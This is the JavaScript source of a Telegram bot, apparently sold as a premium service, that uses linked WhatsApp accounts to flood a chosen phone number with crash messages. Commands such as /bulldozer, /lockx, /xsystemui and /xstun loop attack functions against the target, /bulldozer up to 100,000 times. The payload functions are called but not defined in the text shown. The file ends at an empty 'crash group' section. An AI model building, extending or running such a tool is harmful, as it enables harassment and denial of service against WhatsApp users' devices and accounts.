const { Telegraf, Markup, session } = require("telegraf");
const axios = require('axios');
const path = require("path");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    proto,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let paw = null;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const randomImages = [
    "https://files.catbox.moe/ktuerk.jpg",
    "https://files.catbox.moe/dyp3f7.jpg"
]; // bisa foto n vidio

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const paw = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          paw.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
  await new Promise(r => setTimeout(r, 2000)); // tunggu 2 detik
  
  try {
    await paw.newsletterFollow("120363334766163982@newsletter");
    await paw.newsletterFollow("120363389218228443@newsletter");
    await paw.newsletterFollow("120363402143383489@newsletter");
  } catch (err) {
    console.error("Gagal follow newsletter:", err);
  }
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, paw);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          paw.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
  const chatId = ctx.chat.id;

  const sentMsg = await ctx.telegram.sendMessage(
    chatId,
    `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: "Markdown" }
  );

  const statusMessage = sentMsg.message_id;

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const paw = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  paw.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, paw);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        chatId,
        statusMessage,
        null,
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
        { parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await paw.requestPairingCode(botNumber, "XPAWXXX1");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await ctx.telegram.editMessageText(
            chatId,
            statusMessage,
            null,
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            { parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
      }
    }
  });

  paw.ev.on("creds.update", saveCreds);

  return paw;
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(getRandomImage, {
      caption: "```\nБлядь, ты не премиум...\n```",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/xnxxsigma" }],
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/xnxxsigma" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/x1deakv" }]
        ]
      }
    });
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

// ----- pwler -----
const progressStages = [
  { text: "[░░░░░░░░░░] 0%", delay: 400 },
  { text: "[█░░░░░░░░░] 10%", delay: 500 },
  { text: "[██░░░░░░░░] 20%", delay: 500 },
  { text: "[████░░░░░░] 40%", delay: 600 },
  { text: "[██████░░░░] 60%", delay: 600 },
  { text: "[████████░░] 80%", delay: 700 },
  { text: "[██████████] 100%\nSuccessfully.", delay: 800 }
];

async function sendProgress(ctx, messageId) {
  for (const stage of progressStages) {
    await new Promise(res => setTimeout(res, stage.delay));
    await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, stage.text);
  }
}

//++++++++++++++++++++++++++++++++++++++++++//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//++++++++++++++++++++++++++++++++++++++++++//
function sendMedia(ctx, mediaUrl, options) {
  const isVideo = /\.(mp4|mov|webm)$/i.test(mediaUrl);
  if (isVideo) {
    return ctx.replyWithVideo(mediaUrl, options);
  } else {
    return ctx.replyWithPhoto(mediaUrl, options);
  }
}

//+++++++++++++++++ menu +++++++++++++++++++//
bot.command('start', async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';

  const mediaUrl = getRandomImage();
  const caption = `\`\`\`ApocalypseBack
( 🌪️ ) A P O C A L Y P S E - Cgafsx
  ━ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @xnxxsigma. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.
──────────────────────────
-# MetadataBotInfoe
  ▢ Version : 3.0
  ▢ Developer : AxpawX1
  ▢ Language : JavaScript 
  ▢ Date : ${new Date().toLocaleDateString()}

Before bug must /addsender 62xxx\`\`\``;

  try {
    await sendMedia(ctx, mediaUrl, {
      caption,
      parse_mode: 'MarkdownV2',
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐗̶͜𝐁̴͟𝐮̶͓𝐠̶͢𝐬̽", callback_data: "bugmenu" }],
          [
            { text: "𝐗̶͟𝐎̴͜𝐰͓͢𝐧̸͟𝐞̷͜𝐫̽u", callback_data: "ownermenu" },
            { text: "𝐓̶͜𝐡̴͢𝐚͓𝐧̷𝐤̾𝐬̶𝐓͟𝐨", callback_data: "thanksto" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Gagal kirim media:", err);
    ctx.reply("Gagal mengirim media.");
  }
});

//// action ////
bot.on("callback_query", async (ctx) => {
  const message = ctx.callbackQuery?.message;
  const data = ctx.callbackQuery?.data;

  if (!message || !message.chat) {
    console.error("callbackQuery.message atau .chat tidak tersedia.");
    return ctx.answerCbQuery("Terjadi kesalahan.");
  }

  const chatId = message.chat.id;
  const messageId = message.message_id;
  const newImage = getRandomImage();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
  newCaption = String.raw`
\`\`\`
🦠 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘐 𝘖 𝘕
──────────────────────────
 ━ 𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.
 ▢ /xsᴛᴜɴ ʊ ɴᴜᴍʙᴇʀ
\`\`\``;
  newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
} else if (data === "ownermenu") {
  newCaption = String.raw`
\`\`\`
👀 𝘖 𝘞 𝘕 𝘌 𝘙 - 𝘔 𝘌 𝘕 𝘜 
──────────────────────────
▢ /addprem <id> <day>
╰➤ Menambahkan akses pada user

▢ /delprem <id>
╰➤ Menghapus akses pada user

▢ /cekprem 
╰➤ Melihat waktu/status prem

▢ /listbot 
╰➤ Melihat jumlah sender
\`\`\``;
  newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
} else if (data === "thanksto") {
  newCaption = String.raw`
\`\`\`
👏 𝘛 𝘏 𝘈 𝘕 𝘒 𝘚  -  𝘛 𝘖 𝘖 
──────────────────────────
▢ Kyuurzy
▢ Dimas bau
▢ Lotus
▢ RenXiter ( display inspiration )

▢ AxpawX1 ( Developer )
n thanks for dark angel n show of bug
\`\`\``;
  newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
} else if (data === "mainmenu") {
  newCaption = String.raw`\`\`\`ApocalypseBack
( 🌪️ ) A P O C A L Y P S E - Cgafsx
  ━ Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @xnxxsigma. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.
──────────────────────────
-# MetadataBotInfoe
  ▢ Version : 3.0
  ▢ Developer : AxpawX1
  ▢ Language : JavaScript 
  ▢ Date : ${new Date().toLocaleDateString()}

Before bug must /addsender 62xxx\`\`\``;
  newButtons = [
    [{ text: "𝐗̶͜𝐁̴͟𝐮̶͓𝐠̶͢𝐬̽", callback_data: "bugmenu" }],
    [
      { text: "𝐗̶͟𝐎̴͜𝐰͓͢𝐧̸͟𝐞̷͜𝐫̽", callback_data: "ownermenu" },
      { text: "𝐓̶͜𝐡̴͢𝐚͓𝐧̷𝐤̾𝐬̶𝐓͟𝐨", callback_data: "thanksto" }
    ]
  ];
}

  try {
    const isVideo = /\.(mp4|mov|webm)$/i.test(newImage);

    await ctx.telegram.editMessageMedia(chatId, messageId, null, {
    type: isVideo ? "video" : "photo",
    media: newImage,
    caption: newCaption,
    parse_mode: "Markdown"
    });

    await ctx.telegram.editMessageReplyMarkup(chatId, messageId, null, {
      inline_keyboard: newButtons
    });
  } catch (err) {
    console.error("Error editing message:", err);
    ctx.answerCbQuery("Terjadi kesalahan saat memperbarui pesan.");
  }
});

//-----------------------------
bot.command('bulldozer', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    const sentMessage = await ctx.replyWithPhoto("https://files.catbox.moe/k25ovn.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘉 𝘜 𝘓 𝘓 𝘋 𝘖 𝘡 𝘌 𝘙
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
...
\`\`\`
`, parse_mode: "Markdown"
    });

    await sendProgress(ctx);

    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘉 𝘜 𝘓 𝘓 𝘋 𝘖 𝘡 𝘌 𝘙
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ${stage.text}
\`\`\`
`, { parse_mode: "Markdown" });
    }

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let count = 1; count <= 100000; count++) {
        await bulldozer(paw, target);
        await sleep(250);
        console.log(chalk.red(`${count}. BULLDOZER RUSH!!!`));
    }

        successCount++;
      } catch (error) {
        failCount++;
      }
    }

        // Kirim pesan sukses setelah proses selesai
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘉 𝘜 𝘓 𝘓 𝘋 𝘖 𝘡 𝘌 𝘙
╰➤ Force berhasil dikirim ke ${target}!
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ sᴜᴄᴄᴇs : ${successCount}
 ▢ ғᴀɪʟᴇᴅ  : ${failCount}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
\`\`\`
`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${target}` }]]
      }
    });
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.command('lockx', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    const sentMessage = await ctx.replyWithPhoto("https://files.catbox.moe/k25ovn.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘊 𝘙 𝘈 𝘚 𝘏
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
...
\`\`\`
`, parse_mode: "Markdown"
    });

    const progressStages = [
      { text: "... 10%", delay: 500 },
      { text: "... 30%", delay: 1000 },
      { text: "... 50%", delay: 1500 },
      { text: "... 70%", delay: 2000 },
      { text: "... 90%", delay: 2500 },
      { text: "... 100%\n✅ Success!", delay: 3000 }
    ];

    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘊 𝘙 𝘈 𝘚 𝘏
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ${stage.text}
\`\`\`
`, { parse_mode: "Markdown" });
    }

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 10; i++) {
  await LocationX(paw, target);
  await sleep(1000);
}

        successCount++;
      } catch (error) {
        failCount++;
      }
    }

        // Kirim pesan sukses setelah proses selesai
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘊 𝘙 𝘈 𝘚 𝘏
╰➤ Force berhasil dikirim ke ${target}!
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ sᴜᴄᴄᴇs : ${successCount}
 ▢ ғᴀɪʟᴇᴅ  : ${failCount}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
\`\`\`
`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${target}` }]]
      }
    });
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.command('xsystemui', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    const sentMessage = await ctx.replyWithPhoto("https://files.catbox.moe/k25ovn.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘚 𝘠 𝘚 𝘛 𝘌 𝘔 𝘜 𝘐
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
...
\`\`\`
`, parse_mode: "Markdown"
    });

    const progressStages = [
      { text: "... 10%", delay: 500 },
      { text: "... 30%", delay: 1000 },
      { text: "... 50%", delay: 1500 },
      { text: "... 70%", delay: 2000 },
      { text: "... 90%", delay: 2500 },
      { text: "... 100%\n✅ Success!", delay: 3000 }
    ];

    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘚 𝘠 𝘚 𝘛 𝘌 𝘔 𝘜 𝘐
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ${stage.text}
\`\`\`
`, { parse_mode: "Markdown" });
    }

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 25; i++) {
      await Uipaw(paw, target);
      await sleep(1000);
    }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

        // Kirim pesan sukses setelah proses selesai
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘚 𝘠 𝘚 𝘛 𝘌 𝘔 𝘜 𝘐
╰➤ Force berhasil dikirim ke ${target}!
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ sᴜᴄᴄᴇs : ${successCount}
 ▢ ғᴀɪʟᴇᴅ  : ${failCount}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
\`\`\`
`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${target}` }]]
      }
    });
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.command('xstun', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    const sentMessage = await ctx.replyWithPhoto("https://files.catbox.moe/k25ovn.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘟 𝘚 𝘛 𝘜 𝘕
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
...
\`\`\`
`, parse_mode: "Markdown"
    });

    const progressStages = [
      { text: "... 10%", delay: 500 },
      { text: "... 30%", delay: 1000 },
      { text: "... 50%", delay: 1500 },
      { text: "... 70%", delay: 2000 },
      { text: "... 90%", delay: 2500 },
      { text: "... 100%\n✅ Success!", delay: 3000 }
    ];

    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘟 𝘚 𝘛 𝘜 𝘕
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ${stage.text}
\`\`\`
`, { parse_mode: "Markdown" });
    }

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 1; i++) {
      await DurationTrick(paw, 24, target);
      await sleep(2000)
    }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

        // Kirim pesan sukses setelah proses selesai
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, null, `
\`\`\`
#- 𝘉 𝘜 𝘎 - 𝘟 𝘚 𝘛 𝘜 𝘕
╰➤ Force berhasil dikirim ke ${target}!
...
 ▢ ᴛᴀʀɢᴇᴛ : ${target}
 ▢ sᴜᴄᴄᴇs : ${successCount}
 ▢ ғᴀɪʟᴇᴅ  : ${failCount}
 ▢ ᴛᴏᴛᴀʟʙᴏᴛ : ${sessions.size}
\`\`\`
`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${target}` }]]
      }
    });
  } catch (error) {
    await ctx.reply(
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

//list bot
bot.command('listbot', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    ctx.reply(
      `#- 𝘓 𝘐 𝘚 𝘛 - 𝘉 𝘖 𝘛
╰➤ Daftar bot yang terhubung\n\n ${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk addsender WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");
    }

    const inputNumber = args[1];
    const botNumber = inputNumber.replace(/[^0-9]/g, "");
    const chatId = ctx.chat.id;

    try {
        await connectToWhatsApp(botNumber, ctx);
    } catch (error) {
        console.error("Error in addsender:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
// ========================= [ CRASH GRUP ] =========================

